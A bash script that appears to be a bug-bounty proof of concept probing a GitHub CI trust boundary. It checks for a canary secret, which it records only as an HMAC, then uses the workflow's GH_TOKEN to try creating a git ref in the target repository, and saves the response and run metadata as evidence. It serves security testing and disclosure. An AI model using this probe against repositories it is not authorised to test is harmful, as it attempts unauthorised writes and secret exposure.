#!/usr/bin/env bash
set -euo pipefail
set +x
umask 077

out=boundary-evidence
mkdir -p "$out"

required=(
  GH_TOKEN TARGET_REPOSITORY TARGET_REPOSITORY_ID HEAD_REPOSITORY
  HEAD_REPOSITORY_ID HEAD_SHA BASE_SHA PR_NUMBER EVENT_NAME ACTOR RUN_ID
  RUN_ATTEMPT WORKFLOW_REF WORKFLOW_SHA PROOF_MESSAGE PROOF_REF
)
for name in "${required[@]}"; do
  test -n "${!name:-}" || { echo "missing required variable: $name" >&2; exit 2; }
done

canary_present=false
canary_hmac=ABSENT
if [[ -n "${COPY_CI_CANARY:-}" ]]; then
  canary_present=true
  canary_hmac="$({ python3 - <<'PY'
import hashlib
import hmac
import os

key = os.environ["COPY_CI_CANARY"].encode()
message = os.environ["PROOF_MESSAGE"].encode()
print(hmac.new(key, message, hashlib.sha256).hexdigest())
PY
  } | tr -d '\r\n')"
fi

script_blob_sha="$(git hash-object ci/h1-boundary-probe.sh)"
request_body="$(jq -cn --arg ref "$PROOF_REF" --arg sha "$BASE_SHA" '{ref:$ref,sha:$sha}')"
request_body_sha256="$(printf '%s' "$request_body" | sha256sum | awk '{print $1}')"

ref_create_http="$(curl -sS \
  -D "$out/ref-create.headers" \
  -o "$out/ref-create.json" \
  -w '%{http_code}' \
  -X POST \
  -H "Authorization: Bearer $GH_TOKEN" \
  -H 'Accept: application/vnd.github+json' \
  -H 'X-GitHub-Api-Version: 2022-11-28' \
  -H 'Content-Type: application/json' \
  --data "$request_body" \
  "https://api.github.com/repos/$TARGET_REPOSITORY/git/refs")"

github_request_id="$(awk 'BEGIN{IGNORECASE=1} /^x-github-request-id:/ {gsub("\r", "", $2); print $2}' "$out/ref-create.headers" | tail -n1)"

jq -n \
  --argjson canary_present "$canary_present" \
  --arg canary_hmac_sha256 "$canary_hmac" \
  --arg target_repository "$TARGET_REPOSITORY" \
  --arg target_repository_id "$TARGET_REPOSITORY_ID" \
  --arg head_repository "$HEAD_REPOSITORY" \
  --arg head_repository_id "$HEAD_REPOSITORY_ID" \
  --arg head_sha "$HEAD_SHA" \
  --arg base_sha "$BASE_SHA" \
  --arg pr_number "$PR_NUMBER" \
  --arg event_name "$EVENT_NAME" \
  --arg actor "$ACTOR" \
  --arg run_id "$RUN_ID" \
  --arg run_attempt "$RUN_ATTEMPT" \
  --arg workflow_ref "$WORKFLOW_REF" \
  --arg workflow_sha "$WORKFLOW_SHA" \
  --arg script_blob_sha "$script_blob_sha" \
  --arg proof_message "$PROOF_MESSAGE" \
  --arg proof_ref "$PROOF_REF" \
  --arg request_body_sha256 "$request_body_sha256" \
  --arg ref_create_http "$ref_create_http" \
  --arg github_request_id "$github_request_id" \
  '{
    schema_version: 1,
    canary_present: $canary_present,
    canary_hmac_sha256: $canary_hmac_sha256,
    target_repository: $target_repository,
    target_repository_id: ($target_repository_id|tonumber),
    head_repository: $head_repository,
    head_repository_id: ($head_repository_id|tonumber),
    head_sha: $head_sha,
    base_sha: $base_sha,
    pr_number: ($pr_number|tonumber),
    event_name: $event_name,
    actor: $actor,
    run_id: ($run_id|tonumber),
    run_attempt: ($run_attempt|tonumber),
    workflow_ref: $workflow_ref,
    workflow_sha: $workflow_sha,
    script_blob_sha: $script_blob_sha,
    proof_message: $proof_message,
    proof_ref: $proof_ref,
    mutation: {
      method: "POST",
      endpoint: ("https://api.github.com/repos/" + $target_repository + "/git/refs"),
      request_body_sha256: $request_body_sha256
    },
    ref_create_http: ($ref_create_http|tonumber),
    github_request_id: $github_request_id
  }' > "$out/boundary-result.json"

# A denied write is an expected successful observation in the external control.
# The immutable verifier job, not this attacker-controlled script, decides pass/fail.
exit 0
